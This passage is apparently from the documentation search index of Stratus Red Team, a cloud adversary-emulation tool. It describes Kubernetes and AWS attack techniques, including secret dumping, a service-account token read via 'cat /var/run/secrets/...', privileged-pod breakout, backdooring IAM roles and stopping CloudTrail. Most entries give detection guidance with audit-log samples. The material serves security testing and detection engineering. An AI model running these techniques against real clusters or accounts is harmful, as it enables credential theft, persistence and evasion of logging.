a Privileged Pod</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/","title":"Dump All Secrets","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#description","title":"Description","text":"<p>Dumps all Secrets from a Kubernetes cluster.  This allow an attacker with the right permissions to trivially access all secrets in the cluster.</p> <p>Warm-up: None</p> <p>Detonation: </p> <ul> <li>Dump secrets using the LIST /api/v1/secrets API</li> <li>This returns all secrets in the K8s clusters, no matter their namespace</li> </ul> <p>References:</p> <ul> <li>https://darkbit.io/blog/the-power-of-kubernetes-rbac-list</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.credential-access.dump-secrets\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs. In particular, look for list secrets requests that are not performed for a specific namespace (i.e., that apply to all namespaces).</p> <p>Sample event (shortened):</p> <pre><code>{\n  \"apiVersion\": \"audit.k8s.io/v1\",\n  \"stage\": \"ResponseComplete\",\n  \"kind\": \"Event\",\n  \"level\": \"Metadata\",\n  \"requestURI\": \"/api/v1/secrets?limit=500\",\n  \"attributes\": {\n    \"objectRef\": {\n      \"resource\": \"secrets\",\n      \"apiVersion\": \"v1\"\n    },\n    \"http\": {\n      \"url_details\": {\n        \"path\": \"/api/v1/secrets\",\n        \"queryString\": {\n          \"limit\": \"500\"\n        }\n      },\n      \"method\": \"list\"\n    }\n  }\n}\n</code></pre> <p>Some built-in Kubernetes components might need to be excluded from such a detection:</p> <ul> <li>namespace-controller</li> <li>kube-state-metrics</li> <li>apiserver</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/","title":"Steal Pod Service Account Token","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#description","title":"Description","text":"<p>Steals a service account token from a running pod, by executing a command in the pod and reading /var/run/secrets/kubernetes.io/serviceaccount/token</p> <p>Warm-up: </p> <ul> <li>Create the Stratus Red Team namespace</li> <li>Create a Service Account</li> <li>Create a Pod running under this service account</li> </ul> <p>Detonation: </p> <ul> <li>Execute <code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code> into the pod to steal its service account token</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.credential-access.steal-serviceaccount-token\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs, looking for execution events.</p> <p>Sample event (shortened):</p> <pre><code>{\n    \"objectRef\": {\n        \"resource\": \"pods\",\n        \"subresource\": \"exec\",\n        \"name\": \"stratus-red-team-sample-pod\",\n    },\n    \"http\": {\n        \"url_details\": {\n            \"path\": \"/api/v1/namespaces/stratus-red-team-ubdaslyp/pods/stratus-red-team-sample-pod/exec\",\n            \"queryString\": {\n                \"command\": \"%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken\",\n                \"stdout\": \"true\"\n            }\n        },\n        \"method\": \"create\"\n    },\n    \"stage\": \"ResponseStarted\",\n    \"kind\": \"Event\",\n    \"level\": \"RequestResponse\",\n    \"requestURI\": \"/api/v1/namespaces/stratus-red-team-ubdaslyp/pods/stratus-red-team-sample-pod/exec?command=cat&amp;command=%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken&amp;stdout=true\",\n}\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/","title":"Create Admin ClusterRole","text":"<p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/#description","title":"Description","text":"<p>Creates a Service Account bound to a cluster administrator role.</p> <p>Warm-up: None</p> <p>Detonation: </p> <ul> <li>Create a Cluster Role with administrative permissions</li> <li>Create a Service Account (in the kube-system namespace)</li> <li>Create a Cluster Role Binding</li> <li>Retrieve the long-lived service account token, stored by K8s in a secret</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.persistence.create-admin-clusterrole\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/","title":"Create Client Certificate Credential","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#description","title":"Description","text":"<p>Creates a client certificate for a privileged user. This client certificate can be used to authenticate to the cluster.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Create a certificate signing request (CSR)</li> <li>Wait for the CSR to be picked up and return a certificate</li> <li>Print the client-side certificate and private key</li> </ul> <p>Note: This attack technique does not succeed on AWS EKS. Due to apparent undocumented behavior,  the managed EKS control plane does not issue a certificate for the certificate signing request (CSR), even when approved. However, it is still relevant to simulate attacker behavior.</p> <p>Note: The certificate is issued to <code>system:kube-controller-manager</code> because it exists in most clusters, and already has a ClusterRoleBinding to <code>ClusterRole/system:kube-controller-manager</code> which includes privileged permissions, such as access all secrets of the cluster and create tokens for any service account.</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.persistence.create-client-certificate\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs. In particular, look for creation and approval of CSR objects, which do  not relate to standard cluster operation (e.g. Kubelet certificate issuance).</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/","title":"Create Long-Lived Token","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Persistence</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#description","title":"Description","text":"<p>Creates a token with a large expiration for a service account. An attacker can create such a long-lived token to easily gain  persistence on a compromised cluster.</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.persistence.create-token\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs. In particular, look for create service account tokens requests to privileged service accounts, or service accounts inside the kube-system namespace.</p> <pre><code>{\n  \"objectRef\": {\n    \"resource\": \"serviceaccounts\",\n    \"subresource\": \"token\",\n    \"name\": \"clusterrole-aggregation-controller\",\n    \"apiVersion\": \"v1\"\n  },\n  \"http\": {\n    \"url_details\": {\n      \"path\": \"/api/v1/namespaces/kube-system/serviceaccounts/clusterrole-aggregation-controller/token\"\n    },\n    \"method\": \"create\",\n    \"status_code\": 201\n  },\n  \"stage\": \"ResponseComplete\",\n  \"kind\": \"Event\",\n  \"level\": \"Metadata\",\n  \"requestURI\": \"/api/v1/namespaces/kube-system/serviceaccounts/clusterrole-aggregation-controller/token\",\n}\n</code></pre> <p>To reduce false positives, it may be useful to filter out the following attributes:</p> <ul> <li>User name is <code>system:kube-controller-manager</code></li> <li>User group contains <code>system:nodes</code></li> </ul> <p>Notes:</p> <ul> <li> <p>The API server audit log does not contain the requested token lifetime, unless the audit logs level is <code>Request</code> or <code>RequestResponse</code> (which is generally not the case)</p> </li> <li> <p>AWS EKS caps the token lifetime to 1 hour, although the behavior is undocumented and not part of Kubernetes itself.</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/","title":"Container breakout via hostPath volume mount","text":"<p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/#description","title":"Description","text":"<p>Creates a Pod with the entire node root filesystem as a hostPath volume mount</p> <p>References:</p> <ul> <li>https://attack.mitre.org/techniques/T1611/</li> <li>https://www.youtube.com/watch?v=gtaaONq-XGY</li> </ul> <p>Warm-up: </p> <ul> <li>Creates the Stratus Red Team namespace</li> </ul> <p>Detonation: </p> <ul> <li>Create a privileged busybox pod with the node root filesystem mounted at \"/host\"      that reads \"/etc/passwd\" from the host filesystem</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.privilege-escalation.hostpath-volume\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/","title":"Privilege escalation through node/proxy permissions","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#description","title":"Description","text":"<p>Uses the node proxy API to proxy a Kubelet request through a worker node. This is a vector of privilege escalation, allowing any principal with the <code>nodes/proxy</code> permission to escalate their privilege to cluster administrator,  bypassing at the same time admission control checks and logging of the API server.</p> <p>Warm-up:</p> <ul> <li>Create a namespace</li> <li>Create a service account in this namespace</li> <li>Create a cluster role with <code>nodes/proxy</code> permissions </li> <li>Bind the cluster role to the service account</li> </ul> <p>Detonation:</p> <ul> <li>Retrieve a token for the service account with <code>nodes/proxy</code> permissions creating during warm-up</li> <li>Use the node proxy API to proxy a benign request to the Kubelet through the worker node</li> </ul> <p>References:</p> <ul> <li>https://blog.aquasec.com/privilege-escalation-kubernetes-rbac</li> <li>https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.22/#-strong-proxy-operations-node-v1-core-strong-</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.privilege-escalation.nodes-proxy\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs, you can identify when the nodes proxy API is used.</p> <p>Sample event (shortened):</p> <pre><code>{\n  \"objectRef\": {\n    \"resource\": \"nodes\",\n    \"subresource\": \"proxy\",\n    \"name\": \"ip-192-168-34-255.eu-west-1.compute.internal\",\n    \"apiVersion\": \"v1\"\n  },\n  \"http\": {\n    \"url_details\": {\n      \"path\": \"/api/v1/nodes/ip-192-168-34-255.eu-west-1.compute.internal/proxy/runningpods/\"\n    },\n    \"method\": \"get\",\n    \"status_code\": 200,\n    \"status_category\": \"OK\"\n  },\n  \"kind\": \"Event\",\n  \"level\": \"Request\",\n  \"requestURI\": \"/api/v1/nodes/ip-192-168-34-255.eu-west-1.compute.internal/proxy/runningpods/\",\n}\n</code></pre> <p>Under normal operating conditions, it's not expected that this API is used frequently.  Consequently, alerting on <code>objectRef.resource == \"nodes\" &amp;&amp; objectRef.subresource == \"proxy\"</code> should yield minimal false positives.</p> <p>Additionally, looking at the Kubelet API path that was proxied can help identify malicious activity (/runningpods in this example). See kubeletctl for an unofficial list of Kubelet API endpoints.</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/","title":"Run a Privileged Pod","text":"<p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#description","title":"Description","text":"<p>Runs a privileged pod. Privileged pods are equivalent to running as root on the worker node, and can be used for privilege escalation.</p> <p>Resources:</p> <ul> <li>https://www.cncf.io/blog/2020/10/16/hack-my-mis-configured-kubernetes-privileged-pods/</li> <li>https://kubernetes.io/docs/tasks/configure-pod-container/security-context/</li> </ul> <p>Warm-up: </p> <ul> <li>Creates the Stratus Red Team namespace</li> </ul> <p>Detonation: </p> <ul> <li>Create a privileged busybox pod</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.privilege-escalation.privileged-pod\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs, looking for pod creation events with <code>requestObject.spec.containers[*].securityContext.privileged</code> set to <code>true</code>.</p> <p>Sample event (shortened):</p> <pre><code>{\n    \"objectRef\": {\n        \"resource\": \"pods\",\n        \"name\": \"k8s.privilege-escalation.privileged-pod\",\n        \"apiVersion\": \"v1\"\n    },\n    \"http\": {\n        \"url_details\": {\n            \"path\": \"/api/v1/namespaces/stratus-red-team-umusjhhg/pods\"\n        },\n        \"method\": \"create\",\n        \"status_code\": 201\n    },\n    \"stage\": \"ResponseComplete\",\n    \"kind\": \"Event\",\n    \"level\": \"RequestResponse\",\n    \"requestURI\": \"/api/v1/namespaces/stratus-red-team-umusjhhg/pods\",\n    \"requestObject\": {\n        \"kind\": \"Pod\",\n        \"spec\": {\n            \"containers\": [{\n                \"image\": \"busybox:stable\",\n                \"args\": [\"while true; do sleep 3600; done\"],\n                \"command\": [\"sh\", \"-c\"],\n                \"securityContext\": {\n                    \"privileged\": true\n                }\n            }]\n        }\n    }\n}\n</code></pre>"},{"location":"user-guide/examples/","title":"Examples","text":"<p>This page contains a full example of using Stratus Red Team.</p>"},{"location":"user-guide/examples/#example-1-basic-usage","title":"Example 1: Basic usage","text":""},{"location":"user-guide/examples/#authenticating-to-aws","title":"Authenticating to AWS","text":"<p>First, we'll authenticate to AWS using aws-vault:</p> <pre><code>$ aws-vault exec sandbox-account\n# If using an IAM user, use instead: aws-vault exec sandbox-account --no-session\n\n$ aws sts get-caller-identity\n{\n    \"UserId\": \"AIDA254BBSGPGUZJKQWRD\",\n    \"Account\": \"012345678912\",\n    \"Arn\": \"arn:aws:iam::012345678912:user/christophe\"\n}\n</code></pre> <p>Stratus Red Team should support any authentication option supported by the AWS Go SDK v2. The general rule of thumb is: if you can run <code>aws sts get-caller-identity</code>, you can run Stratus Red Team.</p>"},{"location":"user-guide/examples/#listing-available-attack-techniques","title":"Listing available Attack Techniques","text":"<p>Let's say we want to confirm our security products identify common persistence mechanisms in our AWS account. Let's ask Stratus Red Team for the relevant available attack techniques:</p> <pre><code>$ stratus list --platform aws --mitre-attack-tactic persistence\n\n+-----------------------------------------------+-----------------------------------------+----------+----------------------+\n| TECHNIQUE ID                                  | TECHNIQUE NAME                          | PLATFORM | MITRE ATT&amp;CK TACTIC  |\n+-----------------------------------------------+-----------------------------------------+----------+----------------------+\n| aws.persistence.iam-backdoor-role             | Backdoor an existing IAM Role           | AWS      | Persistence          |\n| aws.persistence.iam-backdoor-user             | Create an IAM Access Key on an IAM User | AWS      | Persistence          |\n|                                               |                                         |          | Privilege Escalation |\n| aws.persistence.iam-create-user-login-profile | Create a Login Profile on an IAM user   | AWS      | Persistence          |\n|                                               |                                         |          | Privilege Escalation |\n| aws.persistence.iam-create-admin-user            | Create an administrative IAM User       | AWS      | Persistence          |\n|                                               |                                         |          | Privilege Escalation |\n+-----------------------------------------------+-----------------------------------------+----------+----------------------+\n</code></pre>"},{"location":"user-guide/examples/#detonating-an-attack-technique","title":"Detonating an attack technique","text":"<p>We're interested in <code>aws.persistence.iam-backdoor-role</code>, an attack technique that backdoors an existing IAM role to add a trust relationship with a malicious AWS account.</p> <p>Let's retrieve more information about the technique, either through its automatically-generated documentation, or by running:</p> <pre><code>$ stratus show aws.persistence.iam-backdoor-role\nEstablishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.\n\nWarm-up: Creates the prerequisite IAM role.\n\nDetonation: Updates the assume role policy of the IAM role to backdoor it.\n</code></pre> <p>We now know that Stratus Red Team will first create an IAM role in the warm-up phase. In the detonation phase, it will backdoor the role.</p> <p>We could choose to perform the warm-up and detonation phase separately - but for simplicity, let's do it all together:</p> <pre><code>$ stratus detonate aws.persistence.iam-backdoor-role\n2022/01/19 10:28:08 Checking your authentication against the AWS API\n2022/01/19 10:28:09 Warming up aws.persistence.iam-backdoor-role\n2022/01/19 10:28:09 Initializing Terraform\n2022/01/19 10:28:18 Applying Terraform\n2022/01/19 10:28:32 Backdooring IAM role by allowing sts:AssumeRole from an extenral AWS account\n</code></pre> <p>Great! The attack technique has been executed against our AWS account.</p> <p>We can verify this using:</p> <pre><code>$ stratus status\n+------------------------------------+-------------------------------+-----------+\n| ID                                 | NAME                          | STATUS    |\n+------------------------------------+-------------------------------------------+\n| aws.persistence.iam-backdoor-role  | Backdoor an existing IAM Role | DETONATED |\n...\n</code></pre>"},{"location":"user-guide/examples/#viewing-the-resulting-resource","title":"Viewing the resulting resource","text":"<p>If we open the AWS console and go to the role that Stratus Red Team backdoored, we can see the malicious role trust policy:</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n</code></pre>"},{"location":"user-guide/examples/#cleaning-up","title":"Cleaning up","text":"<p>When using <code>stratus detonate</code>, the resources spun up are not cleaned up by default - you'd have to pass the <code>--cleanup</code> flag for that.</p> <p>We can clean up any resources creates by Stratus Red Team using:</p> <pre><code>stratus cleanup aws.persistence.iam-backdoor-role\n</code></pre>"},{"location":"user-guide/examples/#example-2-advanced-usage","title":"Example 2: Advanced usage","text":"<p>In this example, we want to prepare our live environment with the prerequisites ahead of time - say, a few hours before detonating our attack techniques.</p> <p>We start by warming up the techniques we're interested in:</p> <pre><code>stratus warmup aws.defense-evasion.cloudtrail-stop aws.defense-evasion.vpc-remove-flow-logs aws.persistence.iam-backdoor-user\n</code></pre> <p>We now have the prerequisites ready:</p> <pre><code>CloudTrail trail arn:aws:cloudtrail:us-east-1:0123456789012:trail/my-cloudtrail-trail ready\nVPC Flow Logs fl-0ef2f69f9799cf52e in VPC vpc-072ec3075f9b5046a ready\nIAM user sample-legit-user ready\n</code></pre> <p>At this point, we can choose to detonate these attack techniques at any point we want. We can do it right away, or in a few hours / days:</p> <pre><code>stratus detonate aws.defense-evasion.cloudtrail-stop aws.defense-evasion.vpc-remove-flow-logs aws.persistence.iam-backdoor-user\n</code></pre> <pre><code>Stopping CloudTrail trail my-cloudtrail-trail\nRemoving VPC Flow Logs fl-0ef2f69f9799cf52e in VPC vpc-072ec3075f9b5046a\nCreating access key on legit IAM user to simulate backdoor\n</code></pre> <p>Now, say we want to replay (i.e., detonate again) an attack technique a few times, for testing and to iterate building our threat detection rules on the side:</p> <pre><code>stratus detonate aws.persistence.iam-backdoor-user\n</code></pre> <p>You will notice that the second call raises an error:</p> <pre><code>aws.persistence.iam-backdoor-user has already been detonated and is not idempotent. \nRevert it with 'stratus revert' before detonating it again, or use --force\n</code></pre> <p>That's because the detonation of this attack technique is not idempotent, meaning it cannot be detonated multiple times without being reverted. </p> <p>Before re-detonating this technique, we need to revert it:</p> <pre><code>stratus revert aws.persistence.iam-backdoor-user\n</code></pre> <pre><code>2022/01/19 15:43:35 Reverting detonation of technique aws.persistence.iam-backdoor-user\n2022/01/19 15:43:35 Removing access key from IAM user sample-legit-user\n2022/01/19 15:43:36 Removing access key AKIA254BBSGPJNHEDHNR\n+-----------------------------------+-----------------------------------------+--------+\n| ID                                | NAME                                    | STATUS |\n+-----------------------------------+-----------------------------------------+--------+\n| aws.persistence.iam-backdoor-user | Create an IAM Access Key on an IAM User | WARM   |\n+-----------------------------------+-----------------------------------------+--------+\n</code></pre> <p>Our attack technique is now <code>WARM</code>, we can detonate it again:</p> <pre><code>stratus detonate aws.persistence.iam-backdoor-user\n</code></pre> <p>Generally, we can detonate then revert an attack technique indefinitely:</p> <pre><code>while true; do\n  stratus detonate aws.persistence.iam-backdoor-user\n  stratus revert aws.persistence.iam-backdoor-user\n  sleep 1\ndone\n</code></pre> <p>Once we are done with our testing, we can clean up our techniques. Cleaning up a technique will revert its detonation logic (if applicable), then nuke all its prerequisite resources and infrastructure:</p> <pre><code>stratus cleanup aws.defense-evasion.cloudtrail-stop aws.defense-evasion.vpc-remove-flow-logs aws.persistence.iam-backdoor-user\n</code></pre> <p>Or, more succinctly:</p> <pre><code>stratus cleanup --all\n</code></pre>"},{"location":"user-guide/getting-started/","title":"Getting Started","text":""},{"location":"user-guide/getting-started/#installation","title":"Installation","text":"<p>Direct install (required Go 1.18+):</p> <pre><code>go install -v github.com/datadog/stratus-red-team/v2/cmd/stratus@latest\n</code></pre> <ul> <li>Homebrew:</li> </ul> <pre><code>brew tap \"datadog/stratus-red-team\" \"https://github.com/DataDog/stratus-red-team\"\nbrew install datadog/stratus-red-team/stratus-red-team\n</code></pre> <ul> <li> <p>Linux / Windows / macOS: Download a pre-built binary.</p> </li> <li> <p>Docker:</p> </li> </ul> <pre><code>IMAGE=\"ghcr.io/datadog/stratus-red-team\"\nalias stratus=\"docker run --rm -v $HOME/.stratus-red-team/:/root/.stratus-red-team/ -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN -e AWS_DEFAULT_REGION $IMAGE\"\n</code></pre>"},{"location":"user-guide/getting-started/#concepts","title":"Concepts","text":"<p>An attack technique is a granular TTP that has prerequisites infrastructure or configuration. You can see the list of attack techniques supported by Stratus Red Team here.</p> <p>Warming up an attack technique means making sure its prerequisites are met, without detonating it.  Warm-up is a preparation phase, before executing the actual attack. Behind the scenes, Stratus Red Team transparently uses Terraform<sup>1</sup> to spin up and tear down the prerequisites of each attack technique.</p> <p>Detonating an attack technique means executing it against a live environment, for instance against a test AWS account.</p> <p>Reverting an attack technique means \"cancelling\" its detonation, when it had a side effect.</p> <p>Cleaning up an attack technique means nuking all its prerequisites and making sure no resource is left in your environment.</p> <p>An attack technique is idempotent if it can be detonated multiple times without reverting it.</p>"},{"location":"user-guide/getting-started/#example","title":"Example","text":"<p>Let's take an example with the attack technique Exfiltrate EBS Snapshot through Snapshot Sharing.</p> <ul> <li>Warm-up: Create an EBS volume and a snapshot of it</li> <li>Detonation: Share the EBS snapshot with an external AWS account</li> <li>Revert: Unshare the EBS snapshot with the external AWS account</li> <li>Clean-up: Remove the EBS volume and its snapshot</li> </ul>"},{"location":"user-guide/getting-started/#state-machine","title":"State Machine","text":"<p>The diagram below illustrates the different states in which an attack technique can be.</p> <p></p> State Machine of a Stratus Attack Technique"},{"location":"user-guide/getting-started/#sample-usage","title":"Sample Usage","text":"<p>Stratus Red Team is a self-contained Go binary, embedding all the attack techniques it supports emulating.</p> <p>You can list available attack techniques using:</p> <pre><code>stratus list\n</code></pre> <p>Detonating a specific attack technique is as simple as running:</p> <pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>You will get an output similar to:</p> <pre><code>2022/01/18 22:32:11 Checking your authentication against the AWS API\n2022/01/18 22:32:12 Warming up aws.exfiltration.ec2-share-ebs-snapshot\n2022/01/18 22:32:12 Initializing Terraform\n2022/01/18 22:32:19 Applying Terraform\n2022/01/18 22:32:43 Sharing the volume snapshot with an external AWS account ID...\n</code></pre> <p>You can then clean up any leftovers from the technique, which in this case will remove the EBS volume and EBS snapshot:</p> <pre><code>stratus cleanup aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>For more information, see Usage, Examples and the Command Reference.</p>"},{"location":"user-guide/getting-started/#connecting-to-your-cloud-account","title":"Connecting to your cloud account","text":"<p>Stratus Red Team currently supports AWS and Kubernetes.</p> <p>Warning</p> <p>Stratus Red Team is supposed to be used against a sandbox cloud account that does not handle production workloads or infrastructure.</p>"},{"location":"user-guide/getting-started/#aws","title":"AWS","text":"<p>In order to use Stratus attack techniques against AWS, you need to be authenticated prior to running it, for instance:</p> <ul> <li> <p>Using <code>aws-vault</code></p> </li> <li> <p>Using static credentials in <code>~/.aws/config</code>, and setting your desired AWS profile using <code>export AWS_PROFILE=my-profile</code></p> </li> </ul>"},{"location":"user-guide/getting-started/#azure","title":"Azure","text":"<ul> <li>Use the Azure CLI to authenticate against your Azure tenant:</li> </ul> <pre><code>az login\n</code></pre> <ul> <li>Confirm you have access to at least one Azure subscription:</li> </ul> <pre><code>$ az account list\n[\n  {\n    \"cloudName\": \"AzureCloud\",\n    \"homeTenantId\": \"9bd23af5-8f8b-4410-8418-2bc670d4829a\",\n    \"id\": \"45e0ad3f-ff94-499a-a2f0-bbb884e9c4a3\",\n    \"isDefault\": true,\n    \"managedByTenants\": [],\n    \"name\": \"Azure subscription 1\",\n    \"state\": \"Enabled\",\n    \"tenantId\": \"9bd23af5-8f8b-4410-8418-2bc670d4829a\",\n    \"user\": {\n      \"name\": \"you@domain.tld\",\n      \"type\": \"user\"\n    }\n  }\n]\n</code></pre> <ul> <li>Set the environment variable <code>AZURE_SUBSCRIPTION_ID</code>:</li> </ul> <pre><code>export AZURE_SUBSCRIPTION_ID=45e0ad3f-ff94-499a-a2f0-bbb884e9c4a3\n</code></pre> <p>Note</p> <p>When using Stratus Red Team with Azure, the location in which resources are created cannot be configured and is fixed to <code>West US</code> (California). See why here.</p>"},{"location":"user-guide/getting-started/#gcp","title":"GCP","text":"<ul> <li>Use the gcloud CLI to authenticate against GCP:</li> </ul> <pre><code>gcloud auth application-default login\n</code></pre> <ul> <li>Then, set your project ID:</li> </ul> <pre><code>export GOOGLE_PROJECT=your-project-id\n</code></pre>"},{"location":"user-guide/getting-started/#kubernetes","title":"Kubernetes","text":"<p>Stratus Red Team does not create a Kubernetes cluster for you.  Instead, it assumes you're already authenticated against a test Kubernetes cluster with kubectl and uses your default context.</p> <p>As a rule of thumb, Stratus Red Team detonates attack techniques against the cluster you see when running <code>kubectl cluster-info</code>.</p> <p>Tested with Minikube and AWS EKS.</p> <p>Encountering issues? See our troubleshooting page, or open an issue.</p> <ol> <li> <p>While Stratus Red Team uses Terraform under the hood, it doesn't mess with your current Terraform install nor does it require you to install Terraform as a prerequisite. Stratus Red Team will download its own Terraform binary in <code>$HOME/.stratus-red-team</code>.\u00a0\u21a9</p> </li> </ol>"},{"location":"user-guide/programmatic-usage/","title":"Programmatic Usage","text":"<p>Stratus Red Team is mainly used from the CLI, but you can use it programmatically as well! Use-cases include automation, and creating your own attack techniques.</p> <p>Info</p> <p>When using Stratus Red Team programmatically, it will persist its state just like when using the CLI. </p> <p>So for instance, if you warm up a specific attack technique programmatically, running <code>stratus status</code> will show the technique is in <code>WARM</code> state.</p>"},{"location":"user-guide/programmatic-usage/#installing-stratus-red-team-as-a-dependency","title":"Installing Stratus Red Team as a dependency","text":"<p>Run:</p> <pre><code>go get github.com/datadog/stratus-red-team/v2\ngo get -d\n</code></pre>"},{"location":"user-guide/programmatic-usage/#example-usage","title":"Example usage","text":"<p>See https://github.com/DataDog/stratus-red-team/tree/main/examples</p>"},{"location":"user-guide/programmatic-usage/#reference","title":"Reference","text":"<p>https://pkg.go.dev/github.com/datadog/stratus-red-team/v2/pkg/stratus</p>"},{"location":"user-guide/troubleshooting/","title":"Troubleshooting","text":""},{"location":"user-guide/troubleshooting/#you-are-not-authenticated-against-aws-or-you-have-not-set-your-region","title":"\"You are not authenticated against AWS, or you have not set your region.\"","text":"<p>You must be authenticated to AWS before running Stratus Red Team. Typically, you must be able to run <code>aws sts get-caller-identity</code> in your shell before running Stratus Red Team.</p>"},{"location":"user-guide/troubleshooting/#the-argument-region-is-required-but-no-definition-was-found","title":"\"The argument \"region\" is required, but no definition was found\"","text":"<p>This is a Terraform error indicating you did not set <code>AWS_REGION</code>. Set it using:</p> <pre><code>export AWS_REGION=us-east-1\n</code></pre>"},{"location":"user-guide/usage/","title":"Usage","text":"<p>List available TTPs using:</p> <pre><code># List all techniques\nstratus list\n\n# List all persistence techniques\nstratus list --mitre-attack-tactic persistence\n\n# List all AWS tactics\nstratus list --platform aws\n</code></pre> <p>View the detail of a specific technique:</p> <pre><code>$ stratus show aws.exfiltration.ec2-share-ebs-snapshot\nExfiltrates an EBS snapshot by sharing it with an external AWS account.\n\nWarm-up: Creates an EBS volume and 